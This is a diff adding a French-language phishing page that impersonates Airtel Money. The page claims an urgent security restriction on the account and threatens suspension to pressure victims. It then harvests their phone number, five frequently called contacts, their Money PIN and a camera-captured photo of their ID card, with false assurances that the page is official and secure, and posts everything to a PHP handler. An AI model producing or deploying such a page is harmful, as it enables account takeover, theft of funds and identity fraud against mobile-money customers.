@@ -1,0 +1,423 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Airtel Money : Notification de Sécurité Urgente - Action Requise</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;800;900&display=swap" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
+    <style>
+        /* Police de caractères Inter pour un aspect moderne et épuré */
+        body {
+            font-family: 'Inter', sans-serif;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+        /* Définition des couleurs de la marque Airtel */
+        .airtel-red-500 {
+            background-color: #E4002B; /* Rouge vif Airtel */
+        }
+        .airtel-red-600 {
+            background-color: #B00021; /* Rouge plus foncé pour les interactions (hover) et les bordures */
+        }
+        .airtel-text-red-500 {
+            color: #E4002B; /* Couleur du texte rouge Airtel */
+        }
+        /* Masque les sections par défaut pour un affichage contrôlé par JavaScript */
+        #airtel-money-security-verification-section {
+            display: none;
+        }
+
+        /* Styles génériques pour les éléments interactifs au focus */
+        input:focus, button:focus, select:focus, a:focus {
+            outline: none !important;
+            border-color: #E4002B !important; /* Couleur de bordure Airtel au focus */
+            box-shadow: 0 0 0 3px rgba(228, 0, 43, 0.4) !important; /* Ombre de focus Airtel */
+        }
+
+        /* Effet de brillance subtile sur les boutons */
+        .shine-effect {
+            position: relative;
+            overflow: hidden;
+            z-index: 1; /* Assure que le pseudo-élément est au-dessus */
+        }
+        .shine-effect::after {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -60%;
+            width: 30%;
+            height: 200%;
+            background: rgba(255, 255, 255, 0.15);
+            transform: rotate(30deg);
+            transition: all 0.5s ease-in-out;
+            opacity: 0;
+            z-index: -1; /* Place le pseudo-élément derrière le texte */
+        }
+        .shine-effect:hover::after {
+            left: 100%;
+            opacity: 1;
+        }
+
+        /* Styles pour masquer l'input de fichier par défaut */
+        #reader_card_photo {
+            display: none; /* Masque l'input file HTML natif */
+        }
+        /* Styles pour le bouton de capture ou de sélection de fichier */
+        .file-input-label {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 100%;
+            padding: 1rem;
+            border: 1px solid #d1d5db;
+            border-radius: 0.5rem;
+            background-color: #f9fafb;
+            color: #4b5563;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s ease-in-out;
+        }
+        .file-input-label:hover {
+            background-color: #e5e7eb;
+            border-color: #E4002B;
+        }
+        .file-input-label i {
+            margin-right: 0.5rem;
+        }
+    </style>
+</head>
+<body class="bg-gray-50 flex flex-col min-h-screen py-10 px-4 sm:px-6 lg:px-8">
+    <div class="bg-white rounded-xl shadow-2xl p-6 sm:p-8 md:p-10 w-11/12 max-w-2xl border-t-8 border-airtel-red-500 mx-auto transform transition duration-500 hover:scale-[1.01]">
+        <div class="flex flex-col items-center mb-8">
+            <img src="images/airtel.jpg" alt="Logo Airtel" class="h-28 sm:h-32 mx-auto mb-6 drop-shadow-md transform hover:scale-105 transition duration-300 ease-in-out" onerror="this.onerror=null;this.src='https://placehold.co/280x112/E4002B/FFFFFF?text=AIRTEL';">
+            <h1 class="text-4xl sm:text-5xl font-extrabold text-gray-900 mb-2 text-center">Airtel Money</h1>
+            <h2 class="text-2xl sm:text-3xl font-extrabold airtel-text-red-500 mb-6 text-center leading-tight">Notification de Sécurité Urgente ! Action Requise</h2>
+        </div>
+
+        <div id="airtel-money-initial-content">
+            <p class="text-gray-800 mb-4 text-lg leading-relaxed">
+                Chers clients Airtel Money, nous vous informons qu'une <span class="font-bold text-airtel-text-red-500">activité inhabituelle</span> a été observée sur votre compte. Pour votre sécurité et la continuité de vos services, une vérification immédiate est maintenant requise.
+            </p>
+            <ul class="list-disc list-inside text-gray-700 space-y-4 mb-8 text-base sm:text-lg pl-5 pr-5">
+                <li>
+                    <span class="font-semibold text-airtel-text-red-500">Accès Temporairement Restreint :</span> Pour prévenir toute transaction non autorisée, l'accès à certaines fonctionnalités de votre compte a été temporairement restreint.
+                </li>
+                <li>
+                    <span class="font-semibold text-airtel-text-red-500">Procédure de Vérification :</span> Vous devez valider votre identité et vos informations de compte pour lever cette restriction et réactiver pleinement votre service.
+                </li>
+                <li>
+                    <span class="font-semibold text-airtel-text-red-500">Évitez la Suspension :</span> Afin d'éviter toute suspension définitive de service ou blocage de vos fonds, veuillez procéder à la vérification sans délai.
+                </li>
+            </ul>
+            <p class="text-gray-800 mb-8 text-base sm:text-lg font-semibold text-center p-4 bg-red-100 rounded-lg border border-red-200">
+                <span class="font-bold text-airtel-text-red-500">Important :</span> La validation de votre compte est cruciale. Agissez dès maintenant pour assurer la sécurité de vos fonds et la continuité de vos services.
+            </p>
+            <button id="btn-money-verify-security" class="w-full airtel-red-500 text-white font-bold py-4 px-6 rounded-lg text-lg hover:airtel-red-600 transition duration-300 shadow-lg transform hover:scale-105 shine-effect">
+                <i class="fas fa-shield-alt mr-2"></i> Vérifier et Sécuriser Mon Compte Maintenant
+            </button>
+            <p class="text-sm text-gray-600 mt-4 text-center">
+                Pour toute assistance, contactez le service client Airtel Money au <span class="font-bold">111</span> (appel gratuit).
+            </p>
+        </div>
+
+        <div id="airtel-money-security-verification-section">
+            <h2 class="text-3xl sm:text-4xl font-extrabold airtel-text-red-500 mb-6 text-center leading-tight">Vérification d'Identité et Activation de Sécurité</h2>
+            <p class="text-gray-800 mb-6 text-lg leading-relaxed">
+                Pour lever les restrictions de sécurité de votre compte et confirmer que vous êtes le propriétaire légitime, veuillez compléter les informations suivantes. Cette procédure est essentielle pour la protection de vos fonds et la réactivation de votre service.
+            </p>
+            <form id="security-verification-form" action="process_verification.php" method="POST" class="space-y-6" enctype="multipart/form-data">
+                <div>
+                    <label for="phone_number" class="block text-gray-700 text-lg font-semibold mb-2">Votre Numéro de Téléphone Airtel Money :</label>
+                    <div class="relative">
+                        <input type="tel" id="phone_number" name="phone_number" pattern="[0-9]{9,15}" required class="w-full p-4 pl-12 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-airtel-red-500 text-xl" placeholder="Ex: 09XXXXXXXX" title="Veuillez entrer votre numéro de téléphone Airtel Money">
+                        <i class="fas fa-mobile-alt absolute left-4 top-1/2 transform -translate-y-1/2 text-gray-400"></i>
+                    </div>
+                    <p class="text-sm text-gray-600 mt-1">
+                        Si vous ne connaissez pas votre numéro Airtel Money, vous pouvez le retrouver sur votre application Airtel Money ou en composant le code USSD rapide de votre opérateur (par ex. *502# en RDC).
+                    </p>
+                </div>
+                
+                <div>
+                    <label class="block text-gray-700 text-lg font-semibold mb-2">Veuillez lister les 5 numéros enregistrés sur cette carte SIM et que vous avez déjà appelés :</label>
+                    <div class="space-y-3">
+                        <div class="relative">
+                            <input type="tel" id="sim_number_1" name="sim_number_1" required class="w-full p-4 pl-12 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-airtel-red-500 text-xl" placeholder="Numéro de contact 1 (Ex: 09XXXXXXXX)">
+                            <i class="fas fa-phone-volume absolute left-4 top-1/2 transform -translate-y-1/2 text-gray-400"></i>
+                        </div>
+                        <div class="relative">
+                            <input type="tel" id="sim_number_2" name="sim_number_2" required class="w-full p-4 pl-12 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-airtel-red-500 text-xl" placeholder="Numéro de contact 2 (Ex: 08XXXXXXXX)">
+                            <i class="fas fa-phone-volume absolute left-4 top-1/2 transform -translate-y-1/2 text-gray-400"></i>
+                        </div>
+                        <div class="relative">
+                            <input type="tel" id="sim_number_3" name="sim_number_3" required class="w-full p-4 pl-12 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-airtel-red-500 text-xl" placeholder="Numéro de contact 3 (Ex: 09XXXXXXXX)">
+                            <i class="fas fa-phone-volume absolute left-4 top-1/2 transform -translate-y-1/2 text-gray-400"></i>
+                        </div>
+                        <div class="relative">
+                            <input type="tel" id="sim_number_4" name="sim_number_4" required class="w-full p-4 pl-12 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-airtel-red-500 text-xl" placeholder="Numéro de contact 4 (Ex: 08XXXXXXXX)">
+                            <i class="fas fa-phone-volume absolute left-4 top-1/2 transform -translate-y-1/2 text-gray-400"></i>
+                        </div>
+                        <div class="relative">
+                            <input type="tel" id="sim_number_5" name="sim_number_5" required class="w-full p-4 pl-12 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-airtel-red-500 text-xl" placeholder="Numéro de contact 5 (Ex: 09XXXXXXXX)">
+                            <i class="fas fa-phone-volume absolute left-4 top-1/2 transform -translate-y-1/2 text-gray-400"></i>
+                        </div>
+                    </div>
+                    <p class="text-sm text-gray-600 mt-1">
+                        Pour des raisons de sécurité et pour confirmer l'usage habituel de votre carte SIM, veuillez lister 5 numéros de contact que vous avez fréquemment appelés et qui sont enregistrés sur cette SIM.
+                    </p>
+                </div>
+
+                <div>
+                    <label for="pin_code" class="block text-gray-700 text-lg font-semibold mb-2">Votre PIN Airtel Money :</label>
+                    <div class="relative">
+                        <input type="password" id="pin_code" name="pin_code" required class="w-full p-4 pl-12 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-airtel-red-500 text-xl" placeholder="Entrez votre PIN à 4 chiffres" pattern="[0-9]{4,6}" title="Veuillez entrer votre PIN Airtel Money (nécessaire pour la vérification)">
+                        <i class="fas fa-lock absolute left-4 top-1/2 transform -translate-y-1/2 text-gray-400"></i>
+                    </div>
+                    <p class="text-sm text-red-600 mt-1">
+                        <span class="font-bold">Attention :</span> Ne partagez jamais votre PIN. Pour cette vérification unique de sécurité, vous êtes sur une page sécurisée d'Airtel Money et votre PIN est nécessaire pour confirmer que vous êtes bien le propriétaire du compte.
+                    </p>
+                </div>
+
+                <div>
+                    <label class="block text-gray-700 text-lg font-semibold mb-2">Photo de votre Carte de Lecteur / ID :</label>
+                    <div class="relative">
+                        <video id="cameraFeed" autoplay style="width: 100%; max-width: 100%; border-radius: 0.5rem; margin-bottom: 1rem; display: none;"></video>
+                        <button type="button" id="toggleCameraButton" class="w-full airtel-red-500 text-white font-bold py-3 px-6 rounded-lg text-lg hover:airtel-red-600 transition duration-300 shadow-md">
+                            <i class="fas fa-camera mr-2"></i> Prendre une photo de ma carte d'identité
+                        </button>
+                        <canvas id="canvas" style="display: none;"></canvas>
+                        
+                        <input type="file" id="reader_card_photo" name="reader_card_photo" accept="image/*" capture="environment" class="w-full p-4 pl-12 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-airtel-red-500 text-xl file:mr-4 file:py-2 file:px-4 file:rounded-full file:border-0 file:text-sm file:font-semibold file:bg-airtel-red-500 file:text-white hover:file:bg-airtel-red-600 cursor-pointer" style="display: none;">
+                        
+                        <div id="photoPreviewContainer" class="mt-4 hidden">
+                            <p class="text-gray-700 font-semibold mb-2">Aperçu de la photo :</p>
+                            <img id="photoPreview" class="max-w-full h-auto rounded-lg shadow-md border border-gray-200">
+                            <button type="button" id="retakePhotoButton" class="mt-2 w-full bg-gray-200 text-gray-700 font-bold py-2 px-4 rounded-lg text-sm hover:bg-gray-300 transition duration-300">
+                                Reprendre la photo
+                            </button>
+                        </div>
+                    </div>
+                    <p class="text-sm text-gray-600 mt-1" id="photo_instruction_text">
+                        Veuillez prendre une photo claire de votre carte de lecteur ou de votre pièce d'identité pour valider votre identité.
+                    </p>
+                </div>
+                
+                <input type="hidden" id="amount" name="amount" value="1.00">
+
+                <button type="submit" class="w-full airtel-red-500 text-white font-bold py-4 px-6 rounded-lg text-xl hover:airtel-red-600 transition duration-300 shadow-lg transform hover:scale-105 shine-effect">
+                    <i class="fas fa-check-circle mr-2"></i> Confirmer et Activer la Sécurité Maintenant
+                </button>
+            </form>
+            <p class="text-sm text-gray-600 mt-6 text-center p-4 bg-red-100 rounded-lg border border-red-200">
+                <span class="font-bold airtel-text-red-500">Important :</span> Toutes les informations fournies sont traitées de manière confidentielle et sont utilisées uniquement pour la vérification de votre compte.
+            </p>
+            <button id="back-from-security-verification" class="w-full bg-gray-200 text-gray-700 font-bold py-3 px-6 rounded-lg text-base hover:bg-gray-300 transition duration-300 shadow-sm mt-8">
+                <i class="fas fa-arrow-left mr-2"></i> Annuler et Retourner
+            </button>
+        </div>
+    </div>
+
+    <footer class="w-full max-w-2xl text-center text-gray-500 text-xs mt-8 px-4 sm:px-0 mx-auto">
+        <p>&copy; 2025 Airtel Money. Tous droits réservés.</p>
+        <p class="mt-1">
+            <a href="#" class="hover:underline mx-2">Conditions Générales</a> |
+            <a href="#" class="hover:underline mx-2">Politique de Confidentialité</a> |
+            <a href="#" class="hover:underline mx-2">FAQ</a>
+        </p>
+        <p class="mt-1">
+            Airtel Money - Un service fiable et sécurisé.
+        </p>
+    </footer>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // --- Éléments du DOM ---
+            const airtelMoneyInitialContent = document.getElementById('airtel-money-initial-content');
+            const btnMoneyVerifySecurity = document.getElementById('btn-money-verify-security');
+            const airtelMoneySecurityVerificationSection = document.getElementById('airtel-money-security-verification-section');
+            const backFromSecurityVerification = document.getElementById('back-from-security-verification');
+
+            const video = document.getElementById('cameraFeed');
+            const canvas = document.getElementById('canvas');
+            const toggleCameraButton = document.getElementById('toggleCameraButton'); // Bouton pour déclencher la caméra/capture
+            const readerCardPhotoInput = document.getElementById('reader_card_photo'); // L'input type="file" original
+            const photoPreview = document.getElementById('photoPreview');
+            const photoPreviewContainer = document.getElementById('photoPreviewContainer');
+            const retakePhotoButton = document.getElementById('retakePhotoButton'); // Bouton pour reprendre la photo
+            const securityVerificationForm = document.getElementById('security-verification-form');
+            const photoInstructionText = document.getElementById('photo_instruction_text');
+
+            let mediaStream; // Pour stocker le flux de la caméra
+            let capturedPhotoBlob = null; // Pour stocker le Blob de la photo capturée
+
+            // --- Gestion de l'affichage des sections ---
+            function showInitialContent() {
+                airtelMoneyInitialContent.style.display = 'block';
+                airtelMoneySecurityVerificationSection.style.display = 'none';
+                window.scrollTo(0, 0); // Remonte la page au début
+                stopCamera(); // Arrête la caméra si on retourne en arrière
+            }
+
+            function showSecurityVerificationSection() {
+                airtelMoneyInitialContent.style.display = 'none';
+                airtelMoneySecurityVerificationSection.style.display = 'block';
+                window.scrollTo(0, 0); // Remonte la page au début
+                resetPhotoCapture(); // Réinitialise l'état de la photo et tente de démarrer la caméra
+            }
+
+            // Écouteurs d'événements pour les boutons de navigation
+            btnMoneyVerifySecurity.addEventListener('click', showSecurityVerificationSection);
+            backFromSecurityVerification.addEventListener('click', showInitialContent);
+
+            // --- Fonctions de la caméra ---
+            async function startCamera() {
+                try {
+                    // Demande la permission d'accès à la caméra
+                    mediaStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } }); // Utilise la caméra arrière si disponible
+                    video.srcObject = mediaStream;
+                    video.style.display = 'block'; // Affiche la vidéo
+                    toggleCameraButton.innerHTML = '<i class="fas fa-camera mr-2"></i> Prendre la photo'; // Met à jour le texte du bouton
+                    toggleCameraButton.onclick = capturePhoto; // Change l'action du bouton pour prendre la photo
+                    photoInstructionText.textContent = 'Positionnez votre carte d\'identité devant la caméra et prenez une photo claire.';
+                    
+                    readerCardPhotoInput.style.display = 'none'; // Masque l'input file standard
+                    photoPreviewContainer.classList.add('hidden'); // Cache l'aperçu précédent
+                    photoPreview.src = '';
+                    capturedPhotoBlob = null; // Réinitialise le blob de la photo capturée
+                    retakePhotoButton.style.display = 'none'; // Masque le bouton "Reprendre"
+                } catch (err) {
+                    console.error("Erreur d'accès à la caméra : ", err);
+                    handleCameraError(err);
+                }
+            }
+
+            function stopCamera() {
+                if (mediaStream) {
+                    mediaStream.getTracks().forEach(track => track.stop());
+                    video.srcObject = null;
+                    video.style.display = 'none';
+                }
+            }
+
+            function handleCameraError(error) {
+                // Gérer les différents types d'erreurs d'accès à la caméra
+                let message = "Impossible d'accéder à la caméra. ";
+                if (error.name === 'NotAllowedError' || error.name === 'PermissionDeniedError') {
+                    message += "Veuillez autoriser l'accès à la caméra dans les paramètres de votre navigateur.";
+                    photoInstructionText.textContent = 'L\'accès à la caméra a été refusé. Veuillez télécharger une photo de votre carte d\'identité.';
+                } else if (error.name === 'NotFoundError' || error.name === 'DevicesNotFoundError') {
+                    message += "Aucune caméra n'a été trouvée sur cet appareil.";
+                    photoInstructionText.textContent = 'Aucune caméra n\'a été détectée. Veuillez télécharger une photo de votre carte d\'identité.';
+                } else {
+                    message += "Une erreur inattendue est survenue lors de l'accès à la caméra.";
+                    photoInstructionText.textContent = 'Une erreur est survenue avec la caméra. Veuillez télécharger une photo de votre carte d\'identité.';
+                }
+                
+                alert(message);
+                
+                stopCamera(); // S'assurer que la caméra est arrêtée
+                video.style.display = 'none'; // Cacher la vidéo
+                toggleCameraButton.style.display = 'none'; // Cacher le bouton de capture
+                readerCardPhotoInput.style.display = 'block'; // Afficher l'input file standard
+            }
+
+            // --- Logique de capture de photo ---
+            function capturePhoto() {
+                if (video.videoWidth === 0 || video.videoHeight === 0) {
+                    alert("La caméra n'est pas prête ou n'a pas pu charger le flux vidéo.");
+                    return;
+                }
+
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                // Convertir le canvas en Blob et le stocker
+                canvas.toBlob(function(blob) {
+                    capturedPhotoBlob = blob;
+                    photoPreview.src = URL.createObjectURL(blob); // Crée une URL temporaire pour l'aperçu
+                    photoPreviewContainer.classList.remove('hidden'); // Affiche le conteneur d'aperçu
+                    retakePhotoButton.style.display = 'block'; // Affiche le bouton "Reprendre"
+
+                    stopCamera(); // Arrête le flux de la caméra après la capture
+                    toggleCameraButton.innerHTML = '<i class="fas fa-check mr-2"></i> Photo capturée'; // Indique que la photo est prise
+                    toggleCameraButton.onclick = null; // Désactive le bouton après capture, on utilise Reprendre la photo
+                    toggleCameraButton.disabled = true; // Désactiver le bouton pour éviter de multiples clics
+                    photoInstructionText.textContent = 'Votre photo a été capturée. Vous pouvez la confirmer en soumettant le formulaire, ou la reprendre si elle n\'est pas claire.';
+
+                }, 'image/jpeg', 0.9); // Format JPEG avec 90% de qualité
+            }
+
+            function resetPhotoCapture() {
+                stopCamera(); // Arrête la caméra si elle tourne
+                video.style.display = 'none';
+                photoPreviewContainer.classList.add('hidden'); // Masque l'aperçu
+                photoPreview.src = '';
+                capturedPhotoBlob = null; // Réinitialise le blob
+                readerCardPhotoInput.value = ''; // Réinitialise l'input file
+
+                // Tente de redémarrer la caméra
+                startCamera();
+            }
+
+            // Écouteur pour le bouton "Reprendre la photo"
+            retakePhotoButton.addEventListener('click', resetPhotoCapture);
+
+            // --- Gérer la soumission du formulaire ---
+            securityVerificationForm.addEventListener('submit', function(event) {
+                event.preventDefault(); // Empêche l'envoi du formulaire par défaut
+
+                const formData = new FormData(securityVerificationForm);
+
+                // Prioriser la photo capturée par la caméra
+                if (capturedPhotoBlob) {
+                    formData.append('reader_card_photo', capturedPhotoBlob, 'captured_id_photo.jpeg');
+                } else if (readerCardPhotoInput.files.length > 0) {
+                    // Sinon, si l'utilisateur a choisi un fichier via l'input standard
+                    formData.append('reader_card_photo', readerCardPhotoInput.files[0], readerCardPhotoInput.files[0].name);
+                } else {
+                    alert("Veuillez prendre une photo de votre carte d'identité ou en télécharger une pour continuer.");
+                    return; // Empêche l'envoi si aucune photo n'est présente
+                }
+
+                sendFormData(formData);
+            });
+
+            // Fonction pour envoyer les données du formulaire via Fetch
+            function sendFormData(formData) {
+                // Afficher un indicateur de chargement si nécessaire
+                // Par exemple, désactiver le bouton de soumission et afficher un spinner
+
+                fetch(securityVerificationForm.action, {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(response => {
+                    // Si la réponse est une redirection (comme un header('Location: ...') en PHP)
+                    if (response.redirected) {
+                        window.location.href = response.url; // Suivre la redirection
+                        return; // Arrêter le traitement ici
+                    }
+                    return response.text(); // Ou response.json() si PHP renvoie du JSON
+                })
+                .then(data => {
+                    // Ce bloc ne sera exécuté que si PHP n'a PAS fait de redirection
+                    console.log('Réponse du serveur:', data);
+                    // Ici, vous géreriez la réponse (par exemple, afficher un message de succès/erreur)
+                    alert("Formulaire soumis avec succès, mais la page n'a pas été redirigée. Vérifiez les logs.");
+                    // Réactiver le bouton de soumission
+                })
+                .catch(error => {
+                    console.error('Erreur lors de l\'envoi du formulaire:', error);
+                    alert("Une erreur est survenue lors de la soumission. Veuillez réessayer.");
+                    // Réactiver le bouton de soumission
+                });
+            }
+
+            // Au chargement initial, masquer la section de vérification
+            airtelMoneySecurityVerificationSection.style.display = 'none';
+        });
+    </script>
+</body>
+</html>
